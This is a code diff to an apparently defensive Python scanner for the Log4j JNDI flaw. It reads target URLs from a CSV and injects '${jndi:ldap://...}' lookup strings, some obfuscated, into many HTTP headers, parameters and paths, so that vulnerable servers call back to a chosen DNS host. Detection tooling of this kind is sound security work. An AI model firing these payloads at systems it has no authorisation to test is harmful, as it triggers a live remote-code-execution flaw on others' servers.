@@ -5,104 +5,144 @@ import logging
 import urllib3
 import time
 import csv
+import argparse
 import sys
+import threading
+import queue
+from multiprocessing import Queue
+
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logging.basicConfig(level=logging.INFO)
 
-CANARY_TOKEN = 'ujz5sgvgo7xuvn03ft9qrws5w'
+header_injects = [
+    'X-Api-Version',
+    'User-Agent',
+    'Referer',
+    'X-Druid-Comment',
+    'Origin',
+    'Location',
+    'X-Forwarded-For',
+    'Cookie',
+    'X-Requested-With',
+    'X-Forwarded-Host',
+    'Accept'
+]
 
-def check_post_parameter(method: str, identifier: str, url: str, parameters: list[str], canarytoken: str):
+prefixes_injects = [
+    'jndi:ldap',
+    'jndi:${lower:l}${lower:d}ap'
+    'jndi:rmi',
+    'jndi:dns',
+]
+
+def get_payload(identifier, parameter, hostname, prefix_option: int):
+    return f"${{{prefixes_injects[prefix_option]}://{identifier}-{parameter}.{hostname}}}"
+
+def perform_request(method: str, identifier: str, url: str, url_id: str, parameters: list[str], hostname: str, timeout: int, prefix_option: int):
     try:
         # Injects POST body parameters
+        headers = {}
+        for header in header_injects:
+            headers[header] = get_payload(identifier, header, hostname, prefix_option)
+
         if method == "POST":
             # Generate POST body without url-encode (probably can be prettier)
             data = "{"
             for parameter in parameters:
-                data += f"{parameter}=${{jndi:ldap://x{identifier}-{parameter}.L4J.{canarytoken}.canarytokens.com/a}}&"
+                data += f"{parameter}={get_payload(identifier, parameter, hostname, prefix_option)}&"
             data = data[:-1]
             data += "}"
 
             r = requests.post(
                 url,
+                headers=headers,
+                timeout=timeout,
                 data=data,
-                headers={
-                    'Content-Type': 'text/plain', 
-                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
-                    'Referer': f"${{jndi:ldap://x{identifier}-referer.L4J.{canarytoken}.canarytokens.com/a}}",
-                    'X-Forwarded-For': f"${{jndi:ldap://x{identifier}-x-forwarded-for.L4J.{canarytoken}.canarytokens.com/a}}",
-                    'Authentication': f"${{jndi:ldap://x{identifier}-authentication.L4J.{canarytoken}.canarytokens.com/a}}"
-                },
                 verify=False
             )
-            logging.info(f"Status code: {r.status_code} - POST")
-
+        
         # Injects GET parameters
         elif method == "GET":
             data = {}
             for parameter in parameters:
-                data[parameter] = f"${{jndi:ldap://x{identifier}-{parameter}.L4J..canarytokens.com/a}}"
+                data[parameter] = get_payload(identifier, parameter, hostname, prefix_option)
             r = requests.get(
                 url,
-                headers={
-                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
-                    'Referer': f"${{jndi:ldap://x{identifier}-referer.L4J.{canarytoken}.canarytokens.com/a}}",
-                    'X-Forwarded-For': f"${{jndi:ldap://x{identifier}-x-forwarded-for.L4J.{canarytoken}.canarytokens.com/a}}",
-                    'Authentication': f"${{jndi:ldap://x{identifier}-authentication.L4J.{canarytoken}.canarytokens.com/a}}"
-                },
+                headers=headers,
+                timeout=timeout,
                 params=data,
                 verify=False
             )
-            logging.info(f"Status code: {r.status_code} - GET")
-
+        
         # Injects URL without paramters (No Parameters)
         elif method == "GETNP":
             if url[-1] == "/":
                 url = url[:-1]
             r = requests.get(
-                f"{url}/${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
-                headers={
-                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
-                    'Referer': f"${{jndi:ldap://x{identifier}-referer.L4J.{canarytoken}.canarytokens.com/a}}",
-                    'X-Forwarded-For': f"${{jndi:ldap://x{identifier}-x-forwarded-for.L4J.{canarytoken}.canarytokens.com/a}}",
-                    'Authentication': f"${{jndi:ldap://x{identifier}-authentication.L4J.{canarytoken}.canarytokens.com/a}}"
-                },
+                f"{url}/{get_payload(identifier, 'get', hostname, prefix_option)}",
+                headers=headers,
+                timeout=timeout,
                 verify=False
             )
-            logging.info(f"Status code: {r.status_code} - GET")
 
+        logging.info(f"{identifier} : {url_id} : {url} - {method} : {r.status_code}")
 
     except requests.exceptions.ConnectionError as e:
-        logging.error(f"HTTP connection to {url} error: {e}")
+        logging.warning(f"{identifier} : {url_id} : {url} - {e}")
 
-def main():
-    if len(sys.argv) != 2:
-        print("Usage python3 log4jcheck.py urls.csv")
-        return
+def scan(row_queue: Queue, hostname: str, wait: int, timeout: int, prefix_option: int):
+    while not row_queue.empty():
+        row = row_queue.get()
+        try:
+            url_id = row[0]
+            url = row[1]
+            method = row[2]
+            parameters = row[3].replace(" ", "").split(",") 
+        except IndexError:
+            logging.warning("Filename should be in the following format: URL info, URL, POST/GET/GETNP, query parameters")
+            row_queue.task_done()
+            continue
 
-    filename = sys.argv[1]
-    with open(filename) as csvfile:
-        urlreader = csv.reader(csvfile)
-        next(urlreader, None)  # skip the headers
-        for row in urlreader:
+        if url != "":
+            identifier = uuid.uuid4()
+            # Catch anything and complete the queue item.
             try:
-                url_id = row[0]
-                url = row[1]
-                method = row[2]
-                parameters = row[3].replace(" ", "").split(",") 
-            except IndexError:
-                logging.warning("Filename should be in the following format: URL info, URL, POST or GET, query parameters")
+                perform_request(method, identifier, url, url_id, parameters, hostname, timeout, prefix_option)
+            except Exception as e:
+                logging.error(e)
+                row_queue.task_done()
                 continue
 
-            if url != "":
-                identifier = uuid.uuid4()
-                logging.info(f"{identifier} : {url_id} : {url}")
+            time.sleep(wait)
 
-                check_post_parameter(method, identifier, url, parameters, CANARY_TOKEN)
+        row_queue.task_done()
 
-                # Sleep 1 second to not stress anything
-                time.sleep(1)
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-f", "--file", required=True, help="The CSV filename containing the URLs.")
+    parser.add_argument("-u", "--url", required=True, help="DNS subdomain URL")
+    parser.add_argument("-w", "--wait", type=int, default=1, help="Number of seconds to wait before next request (default: 1)")
+    parser.add_argument("-t", "--timeout", type=int, default=5, help="HTTP timeout in seconds to use (default: 5)")
+    parser.add_argument("-p", "--prefix", type=int, default=0, help="Type of prefix, see prefixes_injects for options. (default: 0, options 0-3)")
+    parser.add_argument("-q", "--threads", type=int, default=1, help="Number of threads to distribute the work")
+    args = parser.parse_args()
 
+    row_queue = queue.Queue()
+
+    with open(args.file) as csvfile:
+        urlreader = csv.reader(csvfile)
+        next(urlreader, None)  # skip the CSV header
+        for row in urlreader:
+            row_queue.put(row)
+        
+    logging.info(f"Starting {args.threads} threads to scan URLs.")
+
+    for i in range(args.threads):
+        t = threading.Thread(target=scan, name=f"Thread {i}", args=(row_queue, args.url, args.wait, args.timeout, args.prefix))
+        t.start()
+    
+    row_queue.join()
 
 if __name__ == "__main__":
     main()
